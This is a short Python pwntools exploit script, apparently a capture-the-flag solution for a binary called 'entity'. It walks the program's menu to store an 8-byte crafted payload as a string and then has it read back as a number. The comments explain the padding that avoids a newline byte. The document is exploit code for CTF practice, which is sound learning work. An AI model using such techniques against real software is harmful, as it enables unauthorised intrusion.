from pwn import *

def conn():
    r = process("./entity")
    # gdb.attach(r)

    # r = remote("142.93.35.129", 31961)

    return r


def main():
    r = conn()

    payload = b"\xc9\x07\xcc\x00\x00\x00\x00\x00" 
    # padding up to 8 bytes with 0s to not add newline (\x0a)
    # works because buf reads 32 bytes from stdin, but memcpy only copies 8 bytes from buf to datastore 
            # (so we place newline somewhere between 8 and 32 bytes)

    r.recvuntil(b">>")
    r.sendline(b"T")
    r.recvuntil(b">>")
    r.sendline(b"S") # write as string
    r.recvuntil(b">>")
    r.sendline(payload) 
    r.recvuntil(b">>")
    r.sendline(b"C") # checks payload as number

    r.interactive()


if __name__ == "__main__":
    main()